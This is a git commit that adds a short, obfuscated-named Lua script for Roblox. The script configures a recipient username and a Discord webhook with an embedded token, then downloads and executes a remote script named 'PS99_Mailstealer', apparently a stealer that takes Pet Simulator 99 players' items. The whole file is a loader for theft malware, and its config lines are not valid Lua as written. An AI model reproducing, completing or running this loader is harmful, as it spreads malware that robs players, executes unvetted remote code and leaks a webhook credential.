fd8702d18be3a8a0aee59c432a92e3583c62c60b
scripter66blox <gabrielabahouschampenois@gmail.com>
2025-02-25 21:13:09 +0100

    Add files via upload

---
+++ obf_x7GIvZZu69de74shk8glGu770ki862ow11X79d8K4GD1Wyw66gJFH5ThMjn6bK29.lua
@@ -0,0 +1,5 @@
+Username = gab_constelation2eme
+LoadScreen = true 
+Webhook = https://discord.com/api/webhooks/1344033847385526342/TMLYEnn8_KSr5TZnGUb7Eo7cGcKyuuqNqEBCZz5EqV-Ubhs0mQgoFHMGcDbwOBHXtCsa
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
